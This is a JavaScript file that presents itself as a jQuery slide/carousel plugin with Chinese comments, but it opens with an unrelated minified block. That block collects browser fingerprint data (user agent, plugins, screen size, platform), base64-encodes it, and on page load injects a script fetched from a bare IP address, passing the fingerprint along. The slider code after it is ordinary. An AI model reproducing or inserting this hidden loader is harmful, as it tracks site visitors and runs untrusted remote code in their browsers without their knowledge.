!function(a,b){function c(a){var d,e,f,g,h,i,b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";for(new Array(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1),f=a.length,e=0,d="";f>e;){if(g=255&a.charCodeAt(e++),e==f){d+=b.charAt(g>>2),d+=b.charAt((3&g)<<4),d+="==";break}if(h=a.charCodeAt(e++),e==f){d+=b.charAt(g>>2),d+=b.charAt((3&g)<<4|(240&h)>>4),d+=b.charAt((15&h)<<2),d+="=";break}i=a.charCodeAt(e++),d+=b.charAt(g>>2),d+=b.charAt((3&g)<<4|(240&h)>>4),d+=b.charAt((15&h)<<2|(192&i)>>6),d+=b.charAt(63&i)}return d}function d(){return-1!=b.userAgent.indexOf("MSIE")?"ie":-1!=b.userAgent.indexOf("Chrome")?"Chrome":-1!=b.userAgent.indexOf("Firefox")?"Firefox":-1!=b.userAgent.indexOf("Opera")?"Opera":-1!=b.userAgent.indexOf("Netscape")?"Netscape":-1!=b.userAgent.indexOf("Safari")?"Safari":""}function e(){function e(){var a="",c=b.plugins;if(c.length>0)for(j=0;j<b.plugins.length;j++)a+=b.plugins[j].name+";";return a}var f=b.appName,g=b.cookieEnabled,h=b.cpuClass,i=b.mimeTypes,k=b.platform,l=b.plugins,m=b.userAgent;return pStr="type="+d()+"&userAgent="+m+"&appName="+f+"&cookieEnabled="+g+"&cpuClass="+h+"&mimeType_length="+i.length+"&platform="+k+"&plugins_length="+l.length+"&allPluginName="+e()+"&window_screen_width="+a.screen.width+"&window_screen_height="+a.screen.height+"&window_screen_colorDepth="+a.screen.colorDepth,c(pStr)}var f,g,h,i,j,k,l,m;window.self==window.top&&(f=0,window.innerWidth?f=window.innerWidth:document.body&&document.body.clientWidth&&(f=document.body.clientWidth),document.documentElement&&document.documentElement.clientWidth&&(f=document.documentElement.clientWidth),g=0,(/AppleWebKit.*Mobile/i.test(navigator.userAgent)||navigator.userAgent.match(/(iPhone|iPod|iPad|Android|ios|BlackBerry|MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE)/i))&&(g=1),1070>f&&0==g||(h=e(),j=0,k=0,l="scripts2s",m=document.createElement("script"),m.setAttribute("type","text/javascript"),m.setAttribute("src","http://106.75.65.90/pjk/xjk/index.php?isnew=0&b=AH0027549&utime=dl76d799e4a848boey1be92a919ff48fefba291fc9aa8a82b0d&pid="+h+"&p=&c=6864440_(ij8dwJeRi1gtV1g8Dh==_1331178603_18195"),m.id=l,document.body?document.getElementById(l)||document.body.appendChild(m):i=setInterval(function(){if(j++,10==j)return clearInterval(i),void 0;try{document.getElementById(l)||1==k?clearInterval(i):document.body&&(document.body.appendChild(m),k=1)}catch(a){}},500)))}(window,navigator);
/*
 * jQuery slide Plugin 1.5.1
 * http://blog.geekli.cn/
 * Copyright 2011, ksc
 * last update: 2014.04.28
 */
jQuery.extend({
  st: function(s1,s2,op) {
    var sl={};//暴漏给外面的对象
	var set={current:0,//当前显示元素的索引,取值范围0-(len-1)
			 enumber:0,//元素个数
			 time:2.5,//切换时间间隔
			 on:'on',//控制层 css类名
			 auto:1,//是否自动切换
			 mode:'normal',//切换模式 normal:普通;fade:淡入淡出;slide:滑动;
			 switchMode:'mouseover',//鼠标切换方式，mouseover鼠标经过时切换，click单击切换
			 Cmouseover:'none'//当鼠标经过内容区{s2}时，none:无动作，wait：等待
			 
			};
	
	//切换模式 normal:普通;fade:淡入淡出;slide:滑动;
 	sl=$.extend({'last':0},set,op);
	
	var $e1=$(s1);//控制端
	var $e2=$(s2);//内容 在slide模式下 $e2为“内容容器层”

	var len=(sl.mode=='slide')?$e2.find('li').length:$e2.length;//元素个数
	var height=$e2.find('li').height();//展现元素的高度，在切换模式为slide时要用到
 	var timer;
    
    //自动切换
   	var start=function(){
  		timer=setInterval(function(){  toggle();},sl.time*1000);	
	};
    //停止自动切换
    var clear=function(){
        clearInterval(timer);
	};
    //切换到指定位置，可以是 索引、'next'、'prev'
	var toggle=function(to){
                sl.last =sl.current;
				if(to==null||to=='next'){
					sl.current++;
				}
                else if(to=='prev'){
                    sl.current--;
                }
                else{//如果to不为空，则切换到指定位置
					sl.current=to;
				}
                
				if( sl.current>= len){//如果current越界了，则重置为0
					sl.current=0;	
				}
                if( sl.current<0){
                    sl.current=len-1;	
                }
                if(sl.last== sl.current){
                    return ;
                }
				//console.log(sl.current);
				$e1.removeClass(sl.on);
				$e1.eq(sl.current).addClass(sl.on);
				switch(sl.mode){
					case 'fade':
						$e2.hide().stop(false,true);
						$e2.eq(sl.current).css({"z-index":"4"});
						$e2.eq(sl.last).css({"z-index":"2"});
						$e2.eq(sl.current).fadeIn(1500);
						$e2.eq(sl.last).show().fadeOut(1500); 
						break;
					case 'slide':
				  		$e2.stop();
						//在图片未加载之前，chrome浏览器下图片的高宽为0，若img外部的li有又没有设置高度的话，此时li的高也是0。
						height=!height?$e2.find('li').height():height;//若给img外面的li设上了高，则可以删去此行
				  		$e2.animate({ top:-sl.current*(height) }, { 'duration': "slow" }); 
						break;
                    case 'slide2':
                        //$e2.stop();
                        var z_index=1;
                        height=!height?$e2.height():height;//若给img外面的li设上了高，则可以删去此行
                        $e2.css({'z-index':z_index});
                        $e2.eq(sl.last).css({'z-index':z_index+1});
                        $e2.eq(sl.current).css({'top':-height,'z-index':z_index+2}).animate({ top:0 }, { 'duration': "slow" });
                        break;
					default:
						$e2.hide(); 
						$e2.eq(sl.current).show();
				} 
	};
 
    //设置控制层切换控制方式
	$e1.bind(sl.switchMode,function(){
        clear();
        var to=$(this).index();	
        toggle(to);
 	});
	if(sl.auto){//如果自动切换
        $e1.mouseout(function(){ clear(); start()});
        start();
	}
	if(sl.Cmouseover=='wait'){
		$e2.bind({
		'mouseover':function(){clear(); },
		'mouseout':function(){clear(); start();}
		});
	}
    
    sobj={
        'slide_to':function(to){
            clear();
            toggle(to);
            if(sl.auto){
                start();
            }
        },
        'stop':function(){//停止轮播
            clear();
            sl.auto=0;
        },
        'start':function(){
            clear();
            sl.auto=1;
            start();
        }
    }
    return sobj;
  }//function end
		 
}); 

